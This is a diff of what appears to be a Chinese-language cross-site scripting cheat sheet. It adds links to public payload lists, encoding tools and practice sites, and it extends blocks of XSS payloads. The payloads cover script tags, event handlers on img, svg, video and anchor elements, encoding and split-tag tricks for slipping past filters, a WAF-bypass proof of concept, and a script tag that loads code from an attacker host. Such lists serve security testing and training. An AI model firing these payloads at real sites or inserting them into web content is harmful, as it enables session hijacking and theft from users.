@@ -1,4 +1,29 @@
-```html
+**payload**
+- [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
+- [masatokinugawa/filterbypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
+- [bugbounty-cheatsheet/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
+- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
+**在线HTML编码**
+- https://www.qqxiuzi.cn/bianma/zifushiti.php
+- http://www.convertstring.com/zh_CN/EncodeDecode/HtmlEncode
+- https://tool.oschina.net/encode
+
+**url编码**
+- http://web.chacuo.net/charseturlencode
+- https://meyerweb.com/eric/tools/dencoder/
+- http://tool.oschina.net/encode?type=4
+- http://www.mxcz.net/tools/Url.aspx
+
+**在线测试**
+- http://demo.testfire.net/
+- https://juice-shop.herokuapp.com/#/search
+- https://xsschop.chaitin.cn/demo/
+
+---
+
+```h
+<script>
 <script>alert(123)</script>
 <script>prompt(1);</script>
 <script>confirm(1);</script>
@@ -11,7 +36,6 @@
 //--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 <script///////////////////////////////////////////////>alert(123)</script>
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
-<svg><script>123<1>alert(123)</script>
 "><script>alert(123)</script>
 '><script>alert(123)</script>
 ><script>alert(123)</script>
@@ -23,14 +47,16 @@
 %3cscript%3ealert("XSS");%3c/script%3e
 &ltscript&gtalert(document.cookie);</script>
 
-绕过进行一次移除操作：
+//绕过进行一次移除操作：
 <scr<script>ipt>alert("XSS")</scr<script>ipt>
-Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：
+
+//Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：
 <script>alert("XSS")</script>
 <script src="http://attacker.org/malicious.js"></script>
 ```
-```html
+```h
 <img>
+<img src=1 onerror=alert(1)>
 <img src=x onerror=alert(123) />
 
 <input>
@@ -44,7 +70,10 @@ Script 标签可以用于定义一个行内的脚本或者从其他地方加载�
 
 <svg>
 <svg onload=alert("xss");>
+<svg><script>alert(123)</script>
 <svg/onload=prompt(1);>
+<svg><script>alert&#114;&1#29;</script>
+<svg><script>123<1>alert(123)</script>
 
 <select>
 <select onfocus=alert(1)></select>
@@ -57,6 +86,8 @@ Script 标签可以用于定义一个行内的脚本或者从其他地方加载�
 <video>
 <video><source onerror="alert(1)">
 <video poster=javascript:alert(1)//></video> // Works Upto Opera 10.5
+<video onkeyup=setTimeout`al\x65rt\x28/1/\x29```>
+<video onkeydown=setTimeout`al\x65rt\x28/1/\x29```>
 
 <audio>
 <audio src=x onerror=alert("xss");>
@@ -83,13 +114,14 @@ onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><
 <isindex type=image src=1 onerror=alert("xss")>   //仅限于IE
 
 <anytag>
-<anytag onmouseover=alert(15)>M
-<anytag onclick=alert(16)>M
+<anytag onmouseover=alert(1)>M
+<anytag onclick=alert(1)>M
 
 <a>
-<a onmouseover=alert(17)>M
-<a onclick=alert(18)>M
-<a href=javascript:alert(19)>M
+<a onmouseover=alert(1)>M
+<a onclick=alert(1)>M
+<a href=javascript:alert(1)>M
+<a href=javasc&#114;ipt:%61%6c%65%72%74%28%31%29>M
 <a href="javascript:alert('test')">link</a>
 
 <div>
@@ -111,8 +143,7 @@ onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><
 <embed>
 <embed/src=javascript:alert(29);>
 ```
-
-```html
+```h
 利用link远程包含js文件
 PS：在无CSP的情况下才可以
 <link rel=import href="http://127.0.0.1/1.js">
@@ -155,7 +186,7 @@ background属性
 
 <portal id="q" src="bing.com" onload="print(q.activate())"></portal>
 ```
-```html
+```h
 Classical #XSS WAF Bypass
 Inline HTMLi + #PHP Strip Tags
 
@@ -165,7 +196,7 @@ Code:
 PoC:
 ?url="onm<>ouseover="ale<>rt(1)
 ```
-```html
+```h
 无害,仅测试
 1<b>1
 <table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>test</h1></td></tr></tbody></table>
